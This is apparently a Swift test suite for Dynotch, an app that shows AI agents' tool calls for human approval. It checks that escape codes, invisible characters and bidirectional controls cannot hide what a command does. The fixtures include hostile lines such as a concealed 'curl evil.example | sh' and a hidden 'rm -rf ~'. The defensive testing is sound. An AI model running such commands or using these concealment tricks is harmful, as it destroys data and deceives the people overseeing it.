import Foundation
import Testing
@testable import Dynotch

struct HonestTextTests {
    private func shown(_ text: String) -> String {
        HonestText.runs(text).map(\.text).joined()
    }

    private func markers(in text: String) -> [String] {
        HonestText.runs(text).filter { $0.kind == .marker }.map(\.text)
    }

    @Test func ordinaryTextIsLeftAlone() {
        let command = "swift build --product Dynotch 2>&1 | tail -5 # ünï 日本語 🙂"
        #expect(shown(command) == command)
        #expect(HonestText.runs(command).count == 1)
    }

    @Test func anEscapeShowsAsAMarkerAndCantHideTheRest() {
        let hiding = "ls\u{1B}[8m; curl evil.example | sh\u{1B}[0m"
        #expect(shown(hiding) == "ls<ESC>[8m; curl evil.example | sh<ESC>[0m")
        #expect(!shown(hiding).unicodeScalars.contains("\u{1B}"))
    }

    @Test func aCarriageReturnCantOverwriteTheStart() {
        #expect(shown("rm -rf ~\rechoing hello") == "rm -rf ~<CR>echoing hello")
    }

    @Test func aBackspaceCantRubOutWhatsBeforeIt() {
        #expect(shown("rm\u{08}\u{08}ls") == "rm<BS><BS>ls")
    }

    @Test(arguments: [(UInt32(0x202E), "<U+202E>"), (0x202D, "<U+202D>"), (0x202A, "<U+202A>"), (0x202B, "<U+202B>"), (0x202C, "<U+202C>"),
                      (0x2066, "<U+2066>"), (0x2067, "<U+2067>"), (0x2068, "<U+2068>"), (0x2069, "<U+2069>"),
                      (0x200E, "<U+200E>"), (0x200F, "<U+200F>"), (0x061C, "<U+061C>")])
    func aBidirectionalControlShowsAsAMarker(value: UInt32, marker: String) throws {
        let scalar = try #require(Unicode.Scalar(value))
        #expect(shown("a\(Character(scalar))b") == "a\(marker)b")
    }

    @Test(arguments: [UInt32(0x200B), 0x200C, 0x200D, 0x2060, 0xFEFF, 0x00AD, 0xE0041, 0xFE0F, 0x034F, 0x3164, 0x115F,
                      0x2028, 0x2029, 0x0085, 0x009B, 0x00A0, 0x2003, 0x3000, 0xE000, 0xFFFE])
    func whatDrawsNothingOrPassesForASpaceShowsAsAMarker(value: UInt32) throws {
        let scalar = try #require(Unicode.Scalar(value))
        #expect(markers(in: "a\(Character(scalar))b") == [String(format: "<U+%04X>", value)])
    }

    @Test func everyC0ControlHasAMarker() throws {
        for value in UInt32(0)..<0x20 where value != 0x09 {
            let scalar = try #require(Unicode.Scalar(value))
            let marker = try #require(HonestText.marker(for: scalar))
            #expect(marker.hasPrefix("<") && marker.hasSuffix(">"))
        }
        #expect(HonestText.marker(for: "\u{7F}") == "<DEL>")
    }

    @Test func aTabIsMarkedQuietly() {
        let runs = HonestText.runs("\tvar x")
        #expect(runs.first?.kind == .tab)
        #expect(runs.first?.text.hasPrefix("→") == true)
    }

    @Test func nothingInterpretedIsLeftInWhatShows() {
        let nasty = "a\u{1B}\u{07}\u{08}\r\u{0B}\u{0C}\u{202E}\u{2066}\u{200B}\u{2028}\u{FEFF}\u{7F}\u{9B}b"
        for run in HonestText.runs(nasty) where run.kind == .text {
            #expect(run.text.unicodeScalars.allSatisfy { HonestText.marker(for: $0) == nil })
        }
        #expect(shown(nasty).unicodeScalars.allSatisfy { $0.isASCII && $0.value >= 0x20 && $0.value < 0x7F })
    }

    @Test func linesSplitAtLineBreaksAndKeepABlankOne() {
        #expect(HonestText.lines(of: "one\n\ntwo\n") == ["one", "", "two", ""])
    }

    @Test func aCarriageReturnBeforeANewLineStaysInSight() {
        let lines = HonestText.lines(of: "one\r\ntwo")
        #expect(lines == ["one\r", "two"])
        #expect(shown(lines[0]) == "one<CR>")
    }

    @Test func aNameIsOneLineAndHasALimit() {
        #expect(HonestText.line("one\ntwo", limit: 40) == "one<LF>two")
        #expect(HonestText.line("  spaced  ", limit: 40) == "spaced")
        #expect(HonestText.line(String(repeating: "a", count: 100), limit: 10)?.count == 10)
        #expect(HonestText.line("", limit: 10) == nil)
        #expect(HonestText.line(nil, limit: 10) == nil)
    }
}

struct CommandNameTests {
    @Test(arguments: [
        ("swift build", "swift build"),
        ("swift build --product Dynotch 2>&1 | tail -5", "swift build"),
        ("npm run screens", "npm run screens"),
        ("cd /Users/sample/lantern && npm run screens -- --watch", "npm run screens"),
        ("git push origin main", "git push"),
        ("cargo test --release", "cargo test"),
        ("make deploy TOKEN=abc", "make deploy"),
        ("./scripts/test.sh --filter Deck", "test.sh"),
        ("/usr/local/bin/lantern serve", "lantern"),
        ("FOO=1 BAR=2 swift test", "swift test"),
        ("sudo -n nice -n 10 swift build", "swift build"),
        ("timeout 60 swift build", "swift build"),
        ("export PATH=/x:$PATH && cd /tmp; ls -la", "ls"),
        ("cd /tmp", "cd"),
        ("swift \\\n  build", "swift build"),
        ("# a comment\nswift build", "swift build"),
        ("(cd docs && npm ci)", "npm ci"),
        ("python3 -c 'print(1)'", "python3"),
    ])
    func itNamesTheCommand(line: String, name: String) {
        #expect(CommandName.of(line) == name)
    }

    @Test(arguments: [
        "curl -H 'Authorization: Bearer hunter2' https://example.com",
        "mysql -u root -phunter2 production",
        "echo hunter2",
        "TOKEN=hunter2 ./deploy.sh",
        "export TOKEN=hunter2 && deploy hunter2",
        "git clone https://hunter2@example.com/repo.git hunter2",
        "git -c http.extraHeader=hunter2 push",
        "docker login -p hunter2",
        "gh auth login --with-token hunter2",
        "npm config set //registry/:_authToken=hunter2",
        "./deploy.sh hunter2",
        "sudo -S <<< hunter2 rm x",
        "cat <<EOF\nhunter2\nEOF",
        "'hunter2",
        "\"hunter2 and more\" --flag",
        "$(cat ~/.hunter2) go",
        "make HUNTER2",
    ])
    func noArgumentGetsThrough(line: String) {
        #expect(!CommandName.of(line).contains("hunter2"))
        #expect(!CommandName.of(line).contains("HUNTER2"))
    }

    @Test func nothingWorthNamingIsACommand() {
        #expect(CommandName.of("") == "command")
        #expect(CommandName.of("   ") == "command")
        #expect(CommandName.of("$BIN --go") == "command")
        #expect(CommandName.of(String(repeating: "x", count: 500)) == "command")
    }

    @Test func aHugeCommandCostsNoMoreThanItsStart() {
        let heredoc = "swift build <<EOF\n" + String(repeating: "line\n", count: 200_000)
        #expect(CommandName.of(heredoc) == "swift build")
    }
}

struct AgentWordsTests {
    @Test(arguments: [
        ("Bash", ["command": "swift build --verbose"], "Running swift build", "Wants to run: swift build"),
        ("Write", ["file_path": "/secret/folder/notes.md"], "Writing notes.md", "Wants to write: notes.md"),
        ("Edit", ["file_path": "/secret/folder/App.swift"], "Editing App.swift", "Wants to edit: App.swift"),
        ("Read", ["file_path": "/secret/folder/App.swift"], "Reading App.swift", "Wants to read: App.swift"),
        ("Grep", ["pattern": "password"], "Searching the code", "Wants to search the code"),
        ("WebFetch", ["url": "https://example.com/?token=x"], "Fetching a page", "Wants to fetch a page"),
        ("WebSearch", ["query": "private question"], "Searching the web", "Wants to search the web"),
        ("mcp__github__create_issue", [:], "Using github", "Wants to use: github"),
        ("SomethingNew", [:], "Using SomethingNew", "Wants to use: SomethingNew"),
    ] as [(String, [String: String], String, String)])
    func aToolSaysWhatItsDoing(tool: String, target: [String: String], doing: String, wants: String) {
        #expect(AgentWords.doing(tool: tool, target: target) == doing)
        #expect(AgentWords.wants(tool: tool, target: target) == wants)
    }

    @Test func aFileWithNoNameIsStillSomething() {
        #expect(AgentWords.doing(tool: "Write", target: [:]) == "Writing a file")
    }

    @Test func aToolNameCantCarryAnEscape() {
        #expect(AgentWords.doing(tool: "Evil\u{1B}[2K", target: [:]) == "Using Evil<ESC>[2K")
    }
}

struct ApprovalLineTests {
    @Test func bashShowsTheCommandWhole() {
        let lines = ApprovalLine.lines(tool: "Bash", input: ["command": "one\ntwo\n\nthree"])
        #expect(lines.map(\.text) == ["one", "two", "", "three"])
        #expect(lines.allSatisfy { $0.tone == .plain })
    }

    @Test func whateverElseBashWasGivenShowsUnderIt() {
        let lines = ApprovalLine.lines(tool: "Bash", input: ["command": "ls", "run_in_background": true, "timeout": 1000])
        #expect(lines.map(\.text) == ["ls", "run_in_background: true", "timeout: 1000"])
        #expect(lines.dropFirst().allSatisfy { $0.tone == .quiet })
    }

    @Test func writeShowsThePathAndTheContent() {
        let lines = ApprovalLine.lines(tool: "Write", input: ["file_path": "/a/b.txt", "content": "hello\nthere"])
        #expect(lines.first == ApprovalLine(text: "/a/b.txt", tone: .path))
        #expect(lines.dropFirst().map(\.text) == ["hello", "there"])
    }

    @Test func editShowsWhatGoesAndWhatComes() {
        let lines = ApprovalLine.lines(tool: "Edit", input: ["file_path": "/a/b.txt", "old_string": "one\ntwo", "new_string": "three",
                                                             "replace_all": true])
        #expect(lines.map(\.text) == ["/a/b.txt", "- one", "- two", "+ three", "replace_all: true"])
        #expect(lines.map(\.tone) == [.path, .removed, .removed, .added, .quiet])
    }

    @Test func anythingElseShowsItsInputWhole() throws {
        let lines = ApprovalLine.lines(tool: "NotebookEdit", input: ["notebook_path": "/a.ipynb", "new_source": "x = 1"])
        let text = lines.map(\.text).joined(separator: "\n")
        let parsed = try JSONSerialization.jsonObject(with: Data(text.utf8)) as? [String: String]
        #expect(parsed == ["notebook_path": "/a.ipynb", "new_source": "x = 1"])
    }

    @Test func anMCPToolShowsItsFullNameAboveItsInput() {
        let lines = ApprovalLine.lines(tool: "mcp__github__create_issue", input: ["title": "x"])
        #expect(lines.first == ApprovalLine(text: "mcp__github__create_issue", tone: .path))
    }

    @Test func aToolWithoutTheFieldsItShouldHaveShowsItsInput() {
        #expect(ApprovalLine.lines(tool: "Write", input: ["file_path": "/a"]).contains { $0.text.contains("file_path") })
        #expect(ApprovalLine.lines(tool: "Bash", input: ["cmd": "ls"]).contains { $0.text.contains("cmd") })
    }

    @Test func nothingLongIsCut() {
        let command = (1...500).map { "line \($0)" }.joined(separator: "\n") + "\nrm -rf ~"
        let approval = AgentApproval(sessionID: "s", project: "p", tool: "Bash", input: ["command": command])
        #expect(approval.command == command)
        #expect(approval.lines.last?.text == "rm -rf ~")
    }

    @Test func aMarkerHeavyLineIsCountedAtTheWidthItShows() {
        let short = ApprovalLine(text: String(repeating: "x", count: 60))
        let wide = ApprovalLine(text: String(repeating: "\u{1B}", count: 60))
        #expect(ApprovalLine.wrappedCount(of: [short]) == 1)
        #expect(ApprovalLine.wrappedCount(of: [wide]) >= 4)
    }

    @Test func countingStopsPastWhatTheWellShows() {
        let lines = Array(repeating: ApprovalLine(text: "x"), count: 100_000)
        #expect(ApprovalLine.wrappedCount(of: lines) == ApprovalLine.mostShown + 1)
        #expect(ApprovalLine.wrappedCount(of: [ApprovalLine(text: String(repeating: "x", count: 1_000_000))]) == ApprovalLine.mostShown + 1)
    }
}

struct ApprovalGuardTests {
    private let start = Date(timeIntervalSinceReferenceDate: 1000)
    private let one = UUID(), two = UUID()

    private func at(_ seconds: TimeInterval) -> Date { start.addingTimeInterval(seconds) }

    private func shown(_ id: UUID?, delay: TimeInterval = 0.6) -> ApprovalGuard {
        var shown = ApprovalGuard()
        shown.delay = delay
        shown.show(id, at: at(0))
        return shown
    }

    @Test func itWaitsAtLeastSixTenthsOfASecond() {
        #expect(ApprovalGuard.delay(doubleClick: 0.2) == 0.6)
        #expect(ApprovalGuard.delay(doubleClick: 0.6) == 0.6)
    }

    @Test func aSlowerDoubleClickWaitsLonger() {
        #expect(ApprovalGuard.delay(doubleClick: 1.5) == 1.5)
    }

    @Test func nothingWorksBeforeTheDelay() {
        let guardrail = shown(one)
        #expect(!guardrail.accepts(one, at: at(0)))
        #expect(!guardrail.accepts(one, at: at(0.599)))
    }

    @Test func itWorksOnceTheDelayIsUp() {
        let guardrail = shown(one)
        #expect(guardrail.accepts(one, at: at(0.6)))
        #expect(guardrail.accepts(one, at: at(30)))
    }

    @Test func nothingWorksBeforeAnythingHasShown() {
        #expect(!ApprovalGuard().accepts(one, at: at(100)))
    }

    @Test func nothingWorksForAnApprovalNotAtTheFront() {
        #expect(!shown(one).accepts(two, at: at(100)))
    }

    @Test func aDifferentApprovalReachingTheFrontStartsOver() {
        var guardrail = shown(one)
        #expect(guardrail.accepts(one, at: at(5)))
        guardrail.show(two, at: at(5))
        #expect(!guardrail.accepts(two, at: at(5.3)))
        #expect(!guardrail.accepts(one, at: at(5.3)))
        #expect(guardrail.accepts(two, at: at(5 + ApprovalGuard.nextDelay)))
    }

    /// A pointer resting on Allow, with the next one come up under it.
    @Test func oneThatFollowsAnotherWaitsLonger() {
        var guardrail = shown(one)
        guardrail.show(two, at: at(5))
        #expect(guardrail.wait == ApprovalGuard.nextDelay)
        #expect(!guardrail.accepts(two, at: at(5 + ApprovalGuard.nextDelay - 0.01)))
        #expect(guardrail.accepts(two, at: at(5 + ApprovalGuard.nextDelay)))
    }

    @Test func oneOnItsOwnDoesnt() {
        var guardrail = shown(one)
        guardrail.show(nil, at: at(5))
        guardrail.show(two, at: at(6))
        #expect(guardrail.wait == 0.6)
    }

    /// What counts is when the press began, however late it's let go.
    @Test func aPressThatBeganTooSoonDoesntCount() {
        let guardrail = shown(one)
        #expect(!guardrail.accepts(one, at: at(0.1)))
        #expect(guardrail.accepts(one, at: at(0.7)))
    }

    @Test func aPressThatBeganOnTheOneBeforeDoesntCount() {
        var guardrail = shown(one)
        let pressed = at(5)
        guardrail.show(two, at: at(5.1))
        #expect(!guardrail.accepts(two, at: pressed))
    }

    @Test func theSameApprovalAgainDoesntStartOver() {
        var guardrail = shown(one)
        guardrail.show(one, at: at(0.5))
        #expect(guardrail.accepts(one, at: at(0.6)))
    }

    @Test func goingAwayAndComingBackStartsOver() {
        var guardrail = shown(one)
        guardrail.show(nil, at: at(5))
        #expect(!guardrail.accepts(one, at: at(5)))
        guardrail.show(one, at: at(6))
        #expect(!guardrail.accepts(one, at: at(6.3)))
    }

    @Test func theLongerDelayIsWhatCounts() {
        let guardrail = shown(one, delay: 1.5)
        #expect(!guardrail.accepts(one, at: at(1)))
        #expect(guardrail.accepts(one, at: at(1.5)))
    }
}

struct HonestTextMarkTests {
    private func shown(_ text: String) -> String { HonestText.runs(text).map(\.text).joined() }

    /// Lines of stacked marks can paint over the lines around them, and over a `-` or a `~`.
    @Test func marksStackedPastAnyWritingAreMarked() {
        let stacked = "x" + String(repeating: "\u{0305}", count: 24)
        #expect(shown(stacked).components(separatedBy: "<U+0305>").count == 23)
        #expect(HonestText.runs(stacked).filter { $0.kind == .marker }.count == 22)
    }

    @Test(arguments: ["e\u{0301}", "o\u{0302}\u{0301}", "\u{0645}\u{0651}\u{064E}", "\u{0E2A}\u{0E31}\u{0E48}"])
    func accentsAndVowelSignsStayAsTheyAre(text: String) {
        #expect(shown(text) == text)
    }

    @Test func theCountStartsAgainOnTheNextLetter() {
        let text = "e\u{0301}\u{0302}a\u{0301}\u{0302}"
        #expect(shown(text) == text)
    }

    @Test func anEnclosingMarkIsMarked() {
        #expect(shown("x\u{20DD}") == "x<U+20DD>")
    }

    @Test(arguments: [(Unicode.Scalar(0x2800)!, "<U+2800>"), (Unicode.Scalar(0xFFFC)!, "<U+FFFC>")])
    func whatDrawsNothingIsMarked(scalar: Unicode.Scalar, marker: String) {
        #expect(HonestText.marker(for: scalar) == marker)
    }

    @Test func rightToLeftWordsKeepTheirPlaces() {
        let text = "mv \u{5D0}\u{5D0} \u{5D1}\u{5D1}"
        #expect(HonestText.keepingOrder(text) == "mv \u{5D0}\u{5D0}\u{200E} \u{5D1}\u{5D1}\u{200E}")
    }

    @Test func aNumberAfterRightToLeftWordsKeepsItsPlace() {
        #expect(HonestText.keepingOrder("\u{5D0} 12 \u{5D1}") == "\u{5D0}\u{200E} 12 \u{5D1}\u{200E}")
    }

    @Test func aMarkStaysWithItsLetter() {
        #expect(HonestText.keepingOrder("\u{5D0}\u{05B7} x") == "\u{5D0}\u{05B7}\u{200E} x")
    }

    @Test func plainTextIsLeftAlone() {
        #expect(HonestText.keepingOrder("rm -rf build") == "rm -rf build")
        #expect(HonestText.keepingOrder("caf\u{E9} \u{65E5}\u{672C}") == "caf\u{E9} \u{65E5}\u{672C}")
    }
}
